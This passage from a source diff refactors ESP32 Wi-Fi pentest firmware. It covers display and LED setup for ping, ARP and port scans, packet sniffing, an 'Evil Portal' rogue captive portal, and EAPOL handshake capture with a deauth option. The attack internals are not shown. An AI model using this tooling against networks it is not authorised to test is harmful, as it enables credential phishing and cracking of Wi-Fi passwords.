     display_obj.tteBar = true;
     display_obj.print_delay_1 = 15;
     display_obj.print_delay_2 = 10;
-    display_obj.initScrollValues(true);
+    //display_obj.initScrollValues(true);
     display_obj.tft.setTextWrap(false);
-    display_obj.tft.setTextColor(TFT_BLACK, color);
-    #ifdef HAS_FULL_SCREEN
-      display_obj.tft.fillRect(0,16,TFT_WIDTH,16, color);
-      if (scan_mode == WIFI_PING_SCAN)
-        display_obj.tft.drawCentreString("Ping Scan",TFT_WIDTH / 2,16,2);
-      else if (scan_mode == WIFI_ARP_SCAN)
-        display_obj.tft.drawCentreString("ARP Scan",TFT_WIDTH / 2,16,2);
-    #endif
-    #ifdef HAS_ILI9341
-      display_obj.touchToExit();
-    #endif
-    display_obj.tft.setTextColor(TFT_RED, TFT_BLACK);
-    display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
+    display_obj.tft.setTextColor(background, color);
   #endif
-  this->current_scan_ip = this->gateway;
-  Serial.print(F("Cleared IPs: "));
-  Serial.println((String)this->clearIPs());
-  if (scan_mode == WIFI_PING_SCAN)
-    Serial.println(F("Starting Ping Scan with..."));
-  else if (scan_mode == WIFI_ARP_SCAN)
-    Serial.println(F("Starting ARP Scan with..."));
-  this->showNetworkInfo();
+}
 
-  if (scan_mode == WIFI_PING_SCAN)
-    buffer_obj.append("Starting Ping Scan with...");
-  else if (scan_mode == WIFI_ARP_SCAN)
+void WiFiScan::writeNetworkInfo() {
   buffer_obj.append("\nSSID: " + (String)this->connected_network);
   buffer_obj.append("\nIP address: ");
   buffer_obj.append(this->ip_addr.toString());
@@ -3113,32 +3280,36 @@ void WiFiScan::RunPingScan(uint8_t scan_mode, uint16_t color)
   buffer_obj.append("\nMAC: ");
   buffer_obj.append((String)WiFi.macAddress());
   buffer_obj.append("\n");
-
-  this->scan_complete = false;
-  
-  initTime = millis();
 }
 
-void WiFiScan::RunPortScanAll(uint8_t scan_mode, uint16_t color)
-{
-  if (scan_mode == WIFI_SCAN_SSH)
-    startLog("sshscan");
-  else if (scan_mode == WIFI_SCAN_TELNET)
-    startLog("telnetscan");
-  else if (scan_mode == WIFI_SCAN_SMTP)
-    startLog("smtp");
-  else if (scan_mode == WIFI_SCAN_DNS)
-    startLog("dns");
-  else if (scan_mode == WIFI_SCAN_HTTP)
-    startLog("http");
-  else if (scan_mode == WIFI_SCAN_HTTPS)
-    startLog("https");
-  else if (scan_mode == WIFI_SCAN_RDP)
-    startLog("rdp");
-  else
-    startLog("portscan");
+void WiFiScan::setWiFiMode(wifi_mode_t mode, wifi_promiscuous_cb_t cb) {
+  esp_wifi_set_storage(WIFI_STORAGE_RAM);
+  esp_wifi_set_mode(mode);
+  esp_wifi_start();
+  this->setMac();
+  esp_wifi_set_promiscuous(true);
+  esp_wifi_set_promiscuous_filter(&filt);
+  esp_wifi_set_promiscuous_rx_cb(cb);
+}
 
-  #ifdef HAS_FLIPPER_LED
+void WiFiScan::prepareScanStage(uint16_t color_1, uint16_t color_2) {
+  #ifdef HAS_SCREEN
+    #ifdef HAS_ILI9341
+      display_obj.touchToExit();
+    #endif
+    display_obj.tft.setTextColor(color_1, color_2);
+    //display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
+  #endif
+}
+
+void WiFiScan::RunPingScan(uint8_t scan_mode, uint16_t color) {
+  if (scan_mode == WIFI_PING_SCAN)
+    startLog(F("pingscan"));
+  else if (scan_mode == WIFI_ARP_SCAN)
+    startLog(F("arpscan"));
+
+  this->setLEDMode(MODE_SNIFF);
+  /*#ifdef HAS_FLIPPER_LED
     flipper_led.sniffLED();
   #elif defined(XIAO_ESP32_S3)
     xiao_led.sniffLED();
@@ -3146,16 +3317,69 @@ void WiFiScan::RunPortScanAll(uint8_t scan_mode, uint16_t color)
     stickc_led.sniffLED();
   #else
     led_obj.setMode(MODE_SNIFF);
-  #endif
+  #endif*/
   
   #ifdef HAS_SCREEN
-    display_obj.TOP_FIXED_AREA_2 = 48;
-    display_obj.tteBar = true;
-    display_obj.print_delay_1 = 15;
-    display_obj.print_delay_2 = 10;
-    display_obj.initScrollValues(true);
-    display_obj.tft.setTextWrap(false);
-    display_obj.tft.setTextColor(TFT_BLACK, color);
+    this->setupScanDisplayArea(TFT_BLACK, color);
+    #ifdef HAS_FULL_SCREEN
+      display_obj.tft.fillRect(0,16,TFT_WIDTH,16, color);
+      if (scan_mode == WIFI_PING_SCAN)
+        display_obj.tft.drawCentreString("Ping Scan",TFT_WIDTH / 2,16,2);
+      else if (scan_mode == WIFI_ARP_SCAN)
+        display_obj.tft.drawCentreString("ARP Scan",TFT_WIDTH / 2,16,2);
+    #endif
+    this->prepareScanStage(TFT_RED, TFT_BLACK);
+  #endif
+  this->current_scan_ip = this->gateway;
+  //Serial.print(F("Cleared IPs: "));
+  this->clearIPs();
+  if (scan_mode == WIFI_PING_SCAN)
+    Serial.println(F("Starting Ping Scan with..."));
+  else if (scan_mode == WIFI_ARP_SCAN)
+    Serial.println(F("Starting ARP Scan with..."));
+  this->showNetworkInfo();
+
+  if (scan_mode == WIFI_PING_SCAN)
+    buffer_obj.append(F("Starting Ping Scan with..."));
+  else if (scan_mode == WIFI_ARP_SCAN)
+  this->writeNetworkInfo();
+
+  this->scan_complete = false;
+  
+  initTime = millis();
+}
+
+void WiFiScan::RunPortScanAll(uint8_t scan_mode, uint16_t color) {
+  if (scan_mode == WIFI_SCAN_SSH)
+    startLog(F("sshscan"));
+  else if (scan_mode == WIFI_SCAN_TELNET)
+    startLog(F("telnetscan"));
+  else if (scan_mode == WIFI_SCAN_SMTP)
+    startLog(F("smtp"));
+  else if (scan_mode == WIFI_SCAN_DNS)
+    startLog(F("dns"));
+  else if (scan_mode == WIFI_SCAN_HTTP)
+    startLog(F("http"));
+  else if (scan_mode == WIFI_SCAN_HTTPS)
+    startLog(F("https"));
+  else if (scan_mode == WIFI_SCAN_RDP)
+    startLog(F("rdp"));
+  else
+    startLog(F("portscan"));
+
+  this->setLEDMode(MODE_SNIFF);
+  /*#ifdef HAS_FLIPPER_LED
+    flipper_led.sniffLED();
+  #elif defined(XIAO_ESP32_S3)
+    xiao_led.sniffLED();
+  #elif defined(MARAUDER_M5STICKC)
+    stickc_led.sniffLED();
+  #else
+    led_obj.setMode(MODE_SNIFF);
+  #endif*/
+  
+  #ifdef HAS_SCREEN
+    this->setupScanDisplayArea(TFT_BLACK, color);
     #ifdef HAS_FULL_SCREEN
       display_obj.tft.fillRect(0,16,TFT_WIDTH,16, color);
       if (scan_mode == WIFI_PORT_SCAN_ALL)
@@ -3175,11 +3399,7 @@ void WiFiScan::RunPortScanAll(uint8_t scan_mode, uint16_t color)
       else if (scan_mode == WIFI_SCAN_RDP)
         display_obj.tft.drawCentreString("RDP Scan",TFT_WIDTH / 2,16,2);
     #endif
-    #ifdef HAS_ILI9341
-      display_obj.touchToExit();
-    #endif
-    display_obj.tft.setTextColor(TFT_RED, TFT_BLACK);
-    display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
+    this->prepareScanStage(TFT_RED, TFT_BLACK);
   #endif
 
   this->current_scan_port = 0;
@@ -3195,17 +3415,8 @@ void WiFiScan::RunPortScanAll(uint8_t scan_mode, uint16_t color)
   Serial.println(F("Starting Port Scan with..."));
   this->showNetworkInfo();
 
-  buffer_obj.append("Starting Port Scan with...");
-  buffer_obj.append("\nSSID: " + (String)this->connected_network);
-  buffer_obj.append("\nIP address: ");
-  buffer_obj.append(this->ip_addr.toString());
-  buffer_obj.append("\nGateway: ");
-  buffer_obj.append(this->gateway.toString());
-  buffer_obj.append("\nNetmask: ");
-  buffer_obj.append(this->subnet.toString());
-  buffer_obj.append("\nMAC: ");
-  buffer_obj.append((String)WiFi.macAddress());
-  buffer_obj.append("\n");
+  buffer_obj.append(F("Starting Port Scan with..."));
+  this->writeNetworkInfo();
 
   this->scan_complete = false;
   initTime = millis();
@@ -3214,7 +3425,7 @@ void WiFiScan::RunPortScanAll(uint8_t scan_mode, uint16_t color)
 void WiFiScan::RunLoadATList() {
   #ifdef HAS_SD
     // Prepare to access the file
-    File file = sd_obj.getFile("/Airtags_0.log");
+    File file = sd_obj.getFile(F("/Airtags_0.log"));
     if (!file) {
       Serial.println(F("Could not open /Airtags_0.log"));
       #ifdef HAS_SCREEN
@@ -3268,7 +3479,7 @@ void WiFiScan::RunLoadATList() {
       display_obj.tft.setTextSize(1);
       display_obj.tft.setTextColor(TFT_CYAN);
     
-      display_obj.tft.print("Loaded Airtags: ");
+      display_obj.tft.print(F("Loaded Airtags: "));
       display_obj.tft.println((String)airtags->size());
     #endif
     Serial.print(F("Loaded Airtags:"));
@@ -3279,9 +3490,9 @@ void WiFiScan::RunLoadATList() {
 void WiFiScan::RunSaveATList(bool save_as) {
   #ifdef HAS_SD
     if (save_as) {
-      sd_obj.removeFile("/Airtags_0.log");
+      sd_obj.removeFile(F("/Airtags_0.log"));
 
-      this->startLog("Airtags");
+      this->startLog(F("Airtags"));
 
       DynamicJsonDocument jsonDocument(2048);
 
@@ -3318,7 +3529,7 @@ void WiFiScan::RunSaveATList(bool save_as) {
 
 void WiFiScan::RunLoadAPList() {
   #ifdef HAS_SD
-    File file = sd_obj.getFile("/APs_0.log");
+    File file = sd_obj.getFile(F("/APs_0.log"));
     if (!file) {
       Serial.println(F("Could not open /APs_0.log"));
       #ifdef HAS_SCREEN
@@ -3327,7 +3538,7 @@ void WiFiScan::RunLoadAPList() {
         display_obj.tft.setCursor(0, 100);
         display_obj.tft.setTextSize(1);
         display_obj.tft.setTextColor(TFT_CYAN);
-        display_obj.tft.println("Could not open /APs_0.log");
+        display_obj.tft.println(F("Could not open /APs_0.log"));
       #endif
       return;
     }
@@ -3357,7 +3568,8 @@ void WiFiScan::RunLoadAPList() {
       ap.selected = false;
 
       if (obj.containsKey("bssid")) {
-        parseBSSID(obj["bssid"], ap.bssid);
+        //parseBSSID(obj["bssid"], ap.bssid);
+        convertMacStringToUint8(obj["bssid"], ap.bssid);
       } else {
         memset(ap.bssid, 0, 6); // Zero BSSID if missing
       }
@@ -3368,6 +3580,10 @@ void WiFiScan::RunLoadAPList() {
       ap.sec      = obj.containsKey("sec")    ? obj["sec"].as<uint8_t>()       : 0;
       ap.wps      = obj.containsKey("wps")    ? obj["wps"].as<bool>()          : false;
       ap.man      = obj.containsKey("man")    ? obj["man"].as<String>()        : "Unknown";
+      ap.has_msg_1 = false;
+      ap.has_msg_2 = false;
+      ap.has_msg_3 = false;
+      ap.has_msg_4 = false;
 
       access_points->add(ap);
       Serial.println("Got: " + ap.essid);
@@ -3381,7 +3597,7 @@ void WiFiScan::RunLoadAPList() {
       display_obj.tft.setCursor(0, 100);
       display_obj.tft.setTextSize(1);
       display_obj.tft.setTextColor(TFT_CYAN);
-      display_obj.tft.print("Loaded APs: ");
+      display_obj.tft.print(F("Loaded APs: "));
       display_obj.tft.println((String)access_points->size());
     #endif
     Serial.print(F("Loaded APs:"));
@@ -3392,9 +3608,9 @@ void WiFiScan::RunLoadAPList() {
 void WiFiScan::RunSaveAPList(bool save_as) {
   #ifdef HAS_SD
     if (save_as) {
-      sd_obj.removeFile("/APs_0.log");
+      sd_obj.removeFile(F("/APs_0.log"));
 
-      this->startLog("APs");
+      this->startLog(F("APs"));
 
       DynamicJsonDocument jsonDocument(2048);
 
@@ -3406,11 +3622,12 @@ void WiFiScan::RunSaveAPList(bool save_as) {
         jsonAp["essid"] = ap.essid;
         jsonAp["channel"] = ap.channel;
 
-        char bssidStr[18];
+        /*char bssidStr[18];
         sprintf(bssidStr, "%02X:%02X:%02X:%02X:%02X:%02X",
                 ap.bssid[0], ap.bssid[1], ap.bssid[2],
                 ap.bssid[3], ap.bssid[4], ap.bssid[5]);
-        jsonAp["bssid"] = bssidStr;
+        jsonAp["bssid"] = bssidStr;*/
+        jsonAp["bssid"] = macToString(ap.bssid);
         jsonAp["rssi"] = ap.rssi;
         jsonAp["packets"] = ap.packets;
         jsonAp["sec"] = ap.sec;
@@ -3430,7 +3647,7 @@ void WiFiScan::RunSaveAPList(bool save_as) {
         display_obj.tft.setTextSize(1);
         display_obj.tft.setTextColor(TFT_CYAN);
       
-        display_obj.tft.print("Saved APs: ");
+        display_obj.tft.print(F("Saved APs: "));
         display_obj.tft.println((String)access_points->size());
       #endif
       Serial.print(F("Saved APs:"));
@@ -3441,7 +3658,7 @@ void WiFiScan::RunSaveAPList(bool save_as) {
 
 void WiFiScan::RunLoadSSIDList() {
   #ifdef HAS_SD
-    File log_file = sd_obj.getFile("/SSIDs_0.log");
+    File log_file = sd_obj.getFile(F("/SSIDs_0.log"));
     if (!log_file) {
       Serial.println(F("Could not open /SSIDs_0.log"));
       #ifdef HAS_SCREEN
@@ -3467,7 +3684,7 @@ void WiFiScan::RunLoadSSIDList() {
       display_obj.tft.setTextSize(1);
       display_obj.tft.setTextColor(TFT_CYAN);
     
-      display_obj.tft.print("Loaded SSIDs: ");
+      display_obj.tft.print(F("Loaded SSIDs: "));
       display_obj.tft.println((String)ssids->size());
     #endif
 
@@ -3481,9 +3698,9 @@ void WiFiScan::RunLoadSSIDList() {
 void WiFiScan::RunSaveSSIDList(bool save_as) {
   #ifdef HAS_SD
     if (save_as) {
-      sd_obj.removeFile("/SSIDs_0.log");
+      sd_obj.removeFile(F("/SSIDs_0.log"));
 
-      this->startLog("SSIDs");
+      this->startLog(F("SSIDs"));
 
       for (int i = 0; i < ssids->size(); i++) {
         if (i < ssids->size() - 1)
@@ -3499,7 +3716,7 @@ void WiFiScan::RunSaveSSIDList(bool save_as) {
         display_obj.tft.setTextSize(1);
         display_obj.tft.setTextColor(TFT_CYAN);
       
-        display_obj.tft.print("Saved SSIDs: ");
+        display_obj.tft.print(F("Saved SSIDs: "));
         display_obj.tft.println((String)ssids->size());
       #endif
       Serial.print(F("Saved SSIDs: "));
@@ -3508,11 +3725,11 @@ void WiFiScan::RunSaveSSIDList(bool save_as) {
   #endif
 }
 
-void WiFiScan::RunEvilPortal(uint8_t scan_mode, uint16_t color)
-{
-  startLog("evil_portal");
+void WiFiScan::RunEvilPortal(uint8_t scan_mode, uint16_t color) {
+  startLog(F("evil_portal"));
 
-  #ifdef HAS_FLIPPER_LED
+  this->setLEDMode(MODE_SNIFF);
+  /*#ifdef HAS_FLIPPER_LED
     flipper_led.sniffLED();
   #elif defined(XIAO_ESP32_S3)
     xiao_led.sniffLED();
@@ -3520,25 +3737,15 @@ void WiFiScan::RunEvilPortal(uint8_t scan_mode, uint16_t color)
     stickc_led.sniffLED();
   #else
     led_obj.setMode(MODE_SNIFF);
-  #endif
+  #endif*/
 
   #ifdef HAS_SCREEN
-    display_obj.TOP_FIXED_AREA_2 = 48;
-    display_obj.tteBar = true;
-    display_obj.print_delay_1 = 15;
-    display_obj.print_delay_2 = 10;
-    display_obj.initScrollValues(true);
-    display_obj.tft.setTextWrap(false);
-    display_obj.tft.setTextColor(TFT_WHITE, color);
+    this->setupScanDisplayArea(TFT_WHITE, color);
     #ifdef HAS_FULL_SCREEN
       display_obj.tft.fillRect(0,16,TFT_WIDTH,16, color);
       display_obj.tft.drawCentreString(" Evil Portal ",TFT_WIDTH / 2,16,2);
     #endif
-    #ifdef HAS_ILI9341
-      display_obj.touchToExit();
-    #endif
-    display_obj.tft.setTextColor(TFT_MAGENTA, TFT_BLACK);
-    display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
+    this->prepareScanStage(TFT_MAGENTA, TFT_BLACK);
   #endif
 
   #ifdef HAS_IDF_3
@@ -3547,26 +3754,19 @@ void WiFiScan::RunEvilPortal(uint8_t scan_mode, uint16_t color)
   #endif
 
   evil_portal_obj.begin(ssids, access_points);
-  //if (!evil_portal_obj.begin(ssids, access_points)) {
-  //  Serial.println("Could not successfully start EvilPortal. Setting WIFI_SCAN_OFF...");
-  //  this->StartScan(WIFI_SCAN_OFF, TFT_MAGENTA);
-  //  return;
-  //}
-  //else
-  //  Serial.println("Setup EvilPortal. Current mode: " + this->currentScanMode);
   this->wifi_initialized = true;
   initTime = millis();
 }
 
 // Function to start running a beacon scan
-void WiFiScan::RunAPScan(uint8_t scan_mode, uint16_t color)
-{
+void WiFiScan::RunAPScan(uint8_t scan_mode, uint16_t color) {
   if (scan_mode != WIFI_SCAN_AP_STA)
-    startPcap("ap");
+    startPcap(F("ap"));
   else
-    startPcap("ap_sta");
+    startPcap(F("ap_sta"));
 
-  #ifdef HAS_FLIPPER_LED
+  this->setLEDMode(MODE_SNIFF);
+  /*#ifdef HAS_FLIPPER_LED
     flipper_led.sniffLED();
   #elif defined(XIAO_ESP32_S3)
     xiao_led.sniffLED();
@@ -3574,16 +3774,11 @@ void WiFiScan::RunAPScan(uint8_t scan_mode, uint16_t color)
     stickc_led.sniffLED();
   #else
     led_obj.setMode(MODE_SNIFF);
-  #endif
+  #endif*/
 
-  Serial.println(text_table4[9] + (String)access_points->size());
+  //Serial.println(text_table4[9] + (String)access_points->size());
   #ifdef HAS_SCREEN
-    display_obj.TOP_FIXED_AREA_2 = 48;
-    display_obj.tteBar = true;
-    display_obj.print_delay_1 = 15;
-    display_obj.print_delay_2 = 10;
-    display_obj.initScrollValues(true);
-    display_obj.tft.setTextWrap(false);
+    this->setupScanDisplayArea(TFT_BLACK, color);
     if (scan_mode != WIFI_SCAN_AP_STA)
       display_obj.tft.setTextColor(TFT_WHITE, color);
     else
@@ -3595,11 +3790,7 @@ void WiFiScan::RunAPScan(uint8_t scan_mode, uint16_t color)
       else
         display_obj.tft.drawCentreString("Scan AP/STA",TFT_WIDTH / 2,16,2);
     #endif
-    #ifdef HAS_ILI9341
-      display_obj.touchToExit();
-    #endif
-    display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
-    display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
+    this->prepareScanStage(TFT_GREEN, TFT_BLACK);
   #endif
 
   delete access_points;
@@ -3613,13 +3804,14 @@ void WiFiScan::RunAPScan(uint8_t scan_mode, uint16_t color)
     esp_wifi_set_country(&country);
     esp_event_loop_create_default();
   #endif
-  esp_wifi_set_storage(WIFI_STORAGE_RAM);
+  this->setWiFiMode(WIFI_MODE_NULL, apSnifferCallbackFull);
+  /*esp_wifi_set_storage(WIFI_STORAGE_RAM);
   esp_wifi_set_mode(WIFI_MODE_NULL);
   esp_wifi_start();
   this->setMac();
   esp_wifi_set_promiscuous(true);
   esp_wifi_set_promiscuous_filter(&filt);
-  esp_wifi_set_promiscuous_rx_cb(&apSnifferCallbackFull);
+  esp_wifi_set_promiscuous_rx_cb(&apSnifferCallbackFull);*/
   this->changeChannel(this->set_channel);
   //esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
   this->wifi_initialized = true;
@@ -3682,18 +3874,18 @@ void WiFiScan::setMac() {
   if ((result != ESP_OK) &&
       ((currentWiFiMode == WIFI_MODE_AP) || (currentWiFiMode == WIFI_MODE_APSTA) || (currentWiFiMode == WIFI_MODE_NULL)))
         Serial.printf("Failed to set AP MAC: %s | 0x%X\n", macToString(this->ap_mac), result);
-  else if ((currentWiFiMode == WIFI_MODE_AP) || (currentWiFiMode == WIFI_MODE_APSTA) || (currentWiFiMode == WIFI_MODE_NULL))
-    Serial.print(F("Successfully set AP MAC: "));
-    Serial.println(macToString(this->ap_mac));
+  //else if ((currentWiFiMode == WIFI_MODE_AP) || (currentWiFiMode == WIFI_MODE_APSTA) || (currentWiFiMode == WIFI_MODE_NULL))
+  //  Serial.print(F("Successfully set AP MAC: "));
+  //  Serial.println(macToString(this->ap_mac));
 
   // Do the station  
   result = esp_wifi_set_mac(WIFI_IF_STA, this->sta_mac);
   if ((result != ESP_OK) &&
       ((currentWiFiMode == WIFI_MODE_STA) || (currentWiFiMode == WIFI_MODE_APSTA)))
         Serial.printf("Failed to set STA MAC: %s | 0x%X\n", macToString(this->sta_mac), result);
-  else if ((currentWiFiMode == WIFI_MODE_STA) || (currentWiFiMode == WIFI_MODE_APSTA))
-    Serial.print(F("Successfully set STA MAC: "));
-    Serial.println(macToString(this->sta_mac));
+  //else if ((currentWiFiMode == WIFI_MODE_STA) || (currentWiFiMode == WIFI_MODE_APSTA))
+  //  Serial.print(F("Successfully set STA MAC: "));
+  //  Serial.println(macToString(this->sta_mac));
 }
 
 void WiFiScan::RunSetMac(uint8_t * mac, bool ap) {
@@ -3775,7 +3967,7 @@ void WiFiScan::logPoint(String lat, String lon, float alt, String datetime, bool
 }
 
 void WiFiScan::writeHeader(bool poi) {
-  Serial.println(F("Writing header to GPX file..."));
+  //Serial.println(F("Writing header to GPX file..."));
   buffer_obj.append(F("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"));
   buffer_obj.append(F("<gpx version=\"1.1\" creator=\"ESP32 GPS Logger\" xmlns=\"http://www.topografix.com/GPX/1/1\">\n"));
   if (!poi)
@@ -3786,7 +3978,7 @@ void WiFiScan::writeHeader(bool poi) {
 }
 
 void WiFiScan::writeFooter(bool poi) {
-  Serial.println(F("Writing footer to GPX file...\n"));
+  //Serial.println(F("Writing footer to GPX file...\n"));
   if (!poi) {
     buffer_obj.append(F("    </trkseg>\n"));
     buffer_obj.append(F("  </trk>\n"));
@@ -3818,7 +4010,7 @@ bool WiFiScan::RunGPSInfo(bool tracker, bool display, bool poi) {
     }
 
     if (display) {
-      Serial.println(F("Refreshing GPS Data on screen..."));
+      //Serial.println(F("Refreshing GPS Data on screen..."));
       #ifdef HAS_SCREEN
 
         // Get screen position ready
@@ -4023,9 +4215,14 @@ void WiFiScan::RunAPInfo(uint16_t index, bool do_display) {
   Serial.println("  Frames: " + (String)access_points->get(index).packets);
   Serial.println("Stations: " + (String)access_points->get(index).stations->size());
   Serial.println("   Brand: " + (String)access_points->get(index).man);
+  Serial.print(F("Complete EAPOL: "));
+  if (this->getCompleteEapol(index) > 0)
+    Serial.println(F("TRUE"));
+  else
+    Serial.println(F("FALSE"));
   
   uint8_t sec = access_points->get(index).sec;
-  bool wps = access_points->get(index).wps;
+  //bool wps = access_points->get(index).wps;
 
   Serial.print(F("Security: "));
   switch (sec) {
@@ -4041,12 +4238,12 @@ void WiFiScan::RunAPInfo(uint16_t index, bool do_display) {
     default:                             Serial.println(F("Unknown")); break;
   }
 
-  Serial.print(F("     WPS: "));
+  /*Serial.print(F("     WPS: "));
   switch (wps) {
     case true:                           Serial.println(F("true")); break;
     case false:                          Serial.println(F("false")); break;
     default:                             Serial.println(F("false")); break;
-  }
+  }*/
 
   #ifdef HAS_SCREEN
     if (do_display) {
@@ -4057,6 +4254,11 @@ void WiFiScan::RunAPInfo(uint16_t index, bool do_display) {
       display_obj.tft.println("  Frames: " + (String)access_points->get(index).packets);
       display_obj.tft.println("Stations: " + (String)access_points->get(index).stations->size());
       display_obj.tft.println("   Brand: " + (String)access_points->get(index).man);
+      display_obj.tft.print(F("Complete EAPOL: "));
+      if (this->getCompleteEapol(index) > 0)
+        display_obj.tft.println(F("TRUE"));
+      else
+        display_obj.tft.println(F("FALSE"));
 
       display_obj.tft.print("Security: ");
       switch (sec) {
@@ -4072,12 +4274,12 @@ void WiFiScan::RunAPInfo(uint16_t index, bool do_display) {
         default:                             display_obj.tft.println(F("Unknown")); break;
       }
 
-      display_obj.tft.print("     WPS: ");
+      /*display_obj.tft.print("     WPS: ");
       switch (wps) {
         case true:                           display_obj.tft.println(F("true")); break;
         case false:                          display_obj.tft.println(F("false")); break;
         default:                             display_obj.tft.println(F("false")); break;
-      }
+      }*/
     }
   #endif
 
@@ -4100,14 +4302,12 @@ void WiFiScan::RunAPInfo(uint16_t index, bool do_display) {
 
 }
 
-void WiFiScan::RunInfo()
-{
+void WiFiScan::RunInfo() {
   uint8_t sta_mac[6];
   uint8_t ap_mac[6];
 
   this->getMAC(true, sta_mac);
   this->getMAC(false, ap_mac);
-  String free_ram = this->freeRAM();
 
   Serial.println(free_ram);
 
@@ -4144,11 +4344,9 @@ void WiFiScan::RunInfo()
   #ifdef HAS_SCREEN
     display_obj.tft.println(text_table4[25] + macToString(sta_mac));
     display_obj.tft.println(text_table4[26] + macToString(ap_mac));
-    display_obj.tft.println(text_table4[27] + free_ram);
   #endif
   Serial.println(text_table4[25] + macToString(sta_mac));
   Serial.println(text_table4[26] + macToString(ap_mac));
-  Serial.println(text_table4[27] + free_ram);
 
   #if defined(HAS_SD)
     if (sd_obj.supported) {
@@ -4195,9 +4393,9 @@ void WiFiScan::RunInfo()
   //#endif
 }
 
-void WiFiScan::RunPacketMonitor(uint8_t scan_mode, uint16_t color)
-{
-  #ifdef HAS_FLIPPER_LED
+void WiFiScan::RunPacketMonitor(uint8_t scan_mode, uint16_t color) {
+  this->setLEDMode(MODE_SNIFF);
+  /*#ifdef HAS_FLIPPER_LED
     flipper_led.sniffLED();
   #elif defined(XIAO_ESP32_S3)
     xiao_led.sniffLED();
@@ -4205,10 +4403,10 @@ void WiFiScan::RunPacketMonitor(uint8_t scan_mode, uint16_t color)
     stickc_led.sniffLED();
   #else
     led_obj.setMode(MODE_SNIFF);
-  #endif
+  #endif*/
 
   if (scan_mode == WIFI_PACKET_MONITOR)
-    startPcap("packet_monitor");
+    startPcap(F("packet_monitor"));
 
   #ifdef HAS_ILI9341
     if ((scan_mode != WIFI_SCAN_PACKET_RATE) &&
@@ -4244,13 +4442,7 @@ void WiFiScan::RunPacketMonitor(uint8_t scan_mode, uint16_t color)
       #endif
     }
     else {
-      display_obj.TOP_FIXED_AREA_2 = 48;
-      display_obj.tteBar = true;
-      display_obj.print_delay_1 = 15;
-      display_obj.print_delay_2 = 10;
-      display_obj.initScrollValues(true);
-      display_obj.tft.setTextWrap(false);
-      display_obj.tft.setTextColor(TFT_WHITE, color);
+      this->setupScanDisplayArea(TFT_WHITE, color);
       #ifdef HAS_FULL_SCREEN
         display_obj.tft.fillRect(0,16,TFT_WIDTH,16, color);
         if (scan_mode == WIFI_PACKET_MONITOR)
@@ -4273,19 +4465,13 @@ void WiFiScan::RunPacketMonitor(uint8_t scan_mode, uint16_t color)
       display_obj.tft.setFreeFont(NULL);
       display_obj.tft.setTextSize(1);
       display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
-      display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
+      //display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
       display_obj.tftDrawChannelScaleButtons(set_channel, false);
       display_obj.tftDrawExitScaleButtons(false);
     }
   #else // Non touch
     #ifdef HAS_SCREEN
-      display_obj.TOP_FIXED_AREA_2 = 48;
-      display_obj.tteBar = true;
-      display_obj.print_delay_1 = 15;
-      display_obj.print_delay_2 = 10;
-      display_obj.initScrollValues(true);
-      display_obj.tft.setTextWrap(false);
-      display_obj.tft.setTextColor(TFT_WHITE, color);
+      this->setupScanDisplayArea(TFT_WHITE, color);
       #ifdef HAS_FULL_SCREEN
         display_obj.tft.fillRect(0,16,TFT_WIDTH,16, color);
         if (scan_mode == WIFI_PACKET_MONITOR)
@@ -4303,36 +4489,33 @@ void WiFiScan::RunPacketMonitor(uint8_t scan_mode, uint16_t color)
           this->drawChannelLine();
         }
       #endif
-      #ifdef HAS_ILI9341
-        display_obj.touchToExit();
-      #endif
-      display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
-      display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
+      this->prepareScanStage(TFT_GREEN, TFT_BLACK);
     #endif
   #endif
 
-  Serial.println(F("Running packet scan..."));
+  //Serial.println(F("Running packet scan..."));
   esp_wifi_init(&cfg2);
   #ifdef HAS_IDF_3
     esp_wifi_set_country(&country);
     esp_event_loop_create_default();
   #endif
-  esp_wifi_set_storage(WIFI_STORAGE_RAM);
+  this->setWiFiMode(WIFI_MODE_NULL, wifiSnifferCallback);
+  /*esp_wifi_set_storage(WIFI_STORAGE_RAM);
   esp_wifi_set_mode(WIFI_MODE_NULL);
   esp_wifi_start();
   this->setMac();
   esp_wifi_set_promiscuous(true);
   esp_wifi_set_promiscuous_filter(&filt);
-  esp_wifi_set_promiscuous_rx_cb(&wifiSnifferCallback);
+  esp_wifi_set_promiscuous_rx_cb(&wifiSnifferCallback);*/
   this->changeChannel(this->set_channel);
   //esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
   this->wifi_initialized = true;
   uint32_t initTime = millis();
 }
 
-void WiFiScan::RunEapolScan(uint8_t scan_mode, uint16_t color)
-{
-  #ifdef HAS_FLIPPER_LED
+void WiFiScan::RunEapolScan(uint8_t scan_mode, uint16_t color) {
+  this->setLEDMode(MODE_SNIFF);
+  /*#ifdef HAS_FLIPPER_LED
     flipper_led.sniffLED();
   #elif defined(XIAO_ESP32_S3)
     xiao_led.sniffLED();
@@ -4340,11 +4523,13 @@ void WiFiScan::RunEapolScan(uint8_t scan_mode, uint16_t color)
     stickc_led.sniffLED();
   #else
     led_obj.setMode(MODE_SNIFF);
-  #endif
+  #endif*/
+
+  this->send_deauth = settings_obj.loadSetting<bool>(text_table4[5]);
   
   num_eapol = 0;
 
-  #ifdef HAS_ILI9341
+  /*#ifdef HAS_ILI9341
     #ifdef HAS_SCREEN
       display_obj.init();
       display_obj.tft.setRotation(1);
@@ -4372,28 +4557,21 @@ void WiFiScan::RunEapolScan(uint8_t scan_mode, uint16_t color)
       display_obj.tftDrawChannelScaleButtons(set_channel);
       display_obj.tftDrawExitScaleButtons();
     #endif
-  #else
-    startPcap("eapol");
+  #else*/
+    startPcap(F("eapol"));
     
     #ifdef HAS_SCREEN
-      display_obj.TOP_FIXED_AREA_2 = 48;
